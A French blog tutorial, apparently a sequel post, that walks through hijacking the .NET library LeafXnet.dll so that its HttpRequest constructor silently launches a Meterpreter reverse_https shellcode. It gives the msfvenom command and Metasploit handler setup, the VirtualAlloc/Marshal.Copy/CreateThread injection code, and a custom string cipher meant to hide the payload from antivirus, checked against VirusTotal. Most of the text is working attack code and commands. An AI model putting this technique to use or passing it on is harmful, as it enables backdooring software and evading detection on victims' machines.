---
title: "Execution de ShellCode grâce au Dll Hidjacking"
date: 2021-12-05T12:00:00Z
description: "Voici comment Détourner une DLL C# Part2"
categories: ["articles"]
tags: ["reverse","tuto"]
keywords: ["tuto", "reverse", "dotnet", ".net","ctf","dll","hijacked","dll hijacking"]
---

## Introduction
Nous avons déjà parlé du DLL Hidjacking dans un article précédent. Nous avions détourné la Bibliothèque *LeafXnet.dll*. 
Nous aurions pu utiliser une autre, comme *Newtonsoft.Json.dll* ou encore *Colorful.Console.dll* .
Voici le résultat que nous avions la dernière fois :

![Alt text](./img/hijacked.png)

Nous récupérions juste les requêtes pour les écrire dans un fichier texte.

### Petit Rappel
Le Dll Hidjacking consiste à modifier une bibliothèque appelée par un programme et ainsi ajouter du code exécuter.
Ainsi la fonction qui est appelée exécutera ce qu'elle est censée faire pour que le programme continue de fonctionner mais elle exécutera des actions en plus.
Voir [mon ancien article ici](http://vozec.fr/articles/pourquoi-vous-devez-s%C3%A9curiser-vos-dll/)

## Objectif
Je vais essayé d'executer du `ShellCode` directement dans la mémoire en utilisant des `fonction C`
On doit donc :
- Détourner une fonction supposée d'être utilisée dans un programme utilisant `LeafXnet.dll`
- Créer Notre ShellCode
- Coder un script qui execute ce shellCode
- Faire en sorte que celui ci soit indetectable

#### Etape 1 : Détournement
On va utiliser la fonction d'initialisation d'une requète :
```C
HttpRequest MyRequest = new HttpRequest();
```

Voici la fonction appelée :

```C
public HttpRequest()
    {
        Init();
    }
```
Je créer un booléen défini sur *False* qui permet de ne lancer qu'une seule fois mon payload dans le cas ou le programme créerait plusieurs requètes .

On y ajoute une fonction supplémentaire qui va être appelée avant
``Init();``

```C
public static async void Request()
    {
      Console.WriteLine("Hello World");  
    }
```
Et on l'appelle dans un Thread en parallèle si le Booléen est sur *False* :
```C
public HttpRequest()
    {
        if (!activated) { activated = true; Thread thr = new Thread(Request); thr.Start(); }
        Init();
    }
```

Résultat :
![Alt text](./img/poc.png)

#### Etape 2 : Création du ShellCode

Nous allons utiliser `MsfVenom` avec ce payload : *windows/x64/meterpreter/reverse_https* de metasploit.

Comme Ceci :
```Bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.31.22.127 LPORT=443 -f csharp -o shellcode.txt
```

On paramètre un listener :
```Bash
use exploit/multi/handler
set LPORT 443
set LHOST 0.0.0.0
set payload windows/x64/meterpreter/reverse_https
exploit
```

On a plus qu'à attendre une connexion

#### Etape 3 : Injection du ShellCode dans la mémoire.

Retournons sur notre fonction Request() :
On y ajoute le shellCode en byte :
```C
public static async void Request()
  {
        byte[] buf = new byte[784] {
        0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x48,0x31,  
        0x85,0xc0,0x75,0xd2[REDACTED],0x58,0x6a,0x00,
        0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5
    };
  }
```

On ajoute la fonction *VirtualAlloc* qui permet d'allouer de la mémoire :
```C
[DllImport("kernel32")]
public static extern IntPtr VirtualAlloc(
      IntPtr lpAddress,
      uint dwSize,
      uint flAllocationType,
      uint flProtect);
```

et on l'appelle dans la fonction :
```C
IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x00001000 | 0x00002000, 0x40);
```

Puis on copie notre ShellCode dans un Buffer, dans la mémoire allouée précédemment :
```C
Marshal.Copy(buf, 0, addr, buf.Length);
```

Enfin, on créer un Thread sur l'adresse :
*(Sans oublier d'importer la fonction C CreateThread)*

```C
[DllImport("kernel32", CharSet = CharSet.Ansi)]
       public static extern IntPtr CreateThread(
           IntPtr lpThreadAttributes,
           uint dwStackSize,
           IntPtr lpStartAddress,
           IntPtr lpParameter,
           uint dwCreationFlags,
           IntPtr lpThreadId);
```
```C
IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
```

Enfin, il faut laisser le processus tourner infiniment. Dans notre scénario le programme ne se ferme pas tout de suite, mais dans cette démonstration, le programme ne fait rien à part créer une requête.
On peut donc ajouter :
```C
Console.ReadLine();
```
Ou
```C
[DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds);
```
```C
WaitForSingleObject(thread, 0xFFFFFFFF);
```
Cela va permettre d'attendre infiniment la fin du programme et ainsi nous laisser un accès à la porte dérobée depuis métasploit.

Finalement, voici notre code :

```C
[DllImport("kernel32")]
public static extern IntPtr VirtualAlloc(
      IntPtr lpAddress,
      uint dwSize,
      uint flAllocationType,
      uint flProtect);

[DllImport("kernel32", CharSet = CharSet.Ansi)]
public static extern IntPtr CreateThread(
      IntPtr lpThreadAttributes,
      uint dwStackSize,
      IntPtr lpStartAddress,
      IntPtr lpParameter,
      uint dwCreationFlags,
      IntPtr lpThreadId);

[DllImport("kernel32.dll", SetLastError = true)]
static extern UInt32 WaitForSingleObject(
      IntPtr hHandle,
      UInt32 dwMilliseconds);

... Namespace ...

public HttpRequest()
      {
        if (!activated) { activated = true; Thread thr = new Thread(Request); thr.Start(); }
        Init();
      }

public static async void Request()
      {
        byte[] buf = new byte[784] {[REDACTED]}
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x00001000 | 0x00002000, 0x40);
        Marshal.Copy(buf, 0, addr, buf.Length);
        IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
      }

```

![Alt text](./img/final.png)

#### Etape 4 : Obfuscation du Shell Code

On sait que notre Shell code est composé de nombre :

```python
_all = [0xfc,0x48,0x83,0xe4, ...]
final = [int(nb) for nb in _all]
print(final)
```
![Alt text](./img/number.png)

On peut donc en former une string Obfusquée pour ensuite la décoder dans le programme et la re-transformer en bytes.

J'ajoute au projet une class que j'ai fait il y a un moment et qui permet de chiffrer/déchiffrer une string à partir d'une clé.
L'algorithme est fait à la main et il n'est donc pas connu des antivirus.
Voici un extrait du Shell Code chiffré :
```
"ᵊᵏ", "ᵌᵎᵄ", "ᵅᵏ", "ᵎᵏ", "ᵌᵎᵄ", "ᵋᵋ", "ᵋᵍ", "ᵊᵏ", "ᵌ", "ᵏᵍᵅ", "ᵌᵍᵏ", "ᵌᵏᵄ", "ᵌᵏᵍ", "ᵏᵉ", "ᵌᵌ", "ᵏ", "ᵋᵈ", "ᵅᵌ", "ᵌᵈ", "ᵌᵎᵎ", "ᵌᵌᵉ", "ᵍ", "ᵍ", "ᵍ", "ᵌᵎᵄ", "ᵌᵏᵅ", "ᵌᵎᵋ", "ᵍ", "ᵍ", "ᵍ", "ᵊᵏ", "ᵌᵎᵎ", "ᵌᵄᵏ", "ᵌᵌᵋ", "ᵌᵍᵎ", "ᵊᵏ", "ᵌ", "ᵏᵍᵅ", "ᵋᵅ", "ᵌᵎᵄ", "ᵋᵉ", "ᵎᵏ", "ᵅᵍ", "ᵌᵎᵄ", "ᵊᵏ", "ᵏᵉ", "ᵊᵎ", "ᵌ", "ᵏᵍᵅ",
```

En ajustant le chiffrement au code précédent, on obtient :

```C
public static async void Request()
    {
        Console.OutputEncoding = Encoding.Unicode;
        crypter cry = new crypter();
        string key = "9457";
        string[] all = new string[784] { REDACTED };
        byte[] buffer = new byte[0];
        for (int i = 0; i < all.Length; i++)
        {
            byte[] newArray = new byte[buffer.Length + 1];
            buffer.CopyTo(newArray, 1);
            string b = await cry.decry(all[i], key);
            newArray[0] = Convert.ToByte(Convert.ToInt32(b));
            buffer = newArray;
        }
        Array.Reverse(buffer);
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buffer.Length, 0x00001000 | 0x00002000, 0x40);
        Marshal.Copy(buffer, 0, addr, buffer.Length);
        IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    }
```

On peut vérifier l'efficacité du payload grâce à Virus Total :
![Alt text](./img/vt.png)
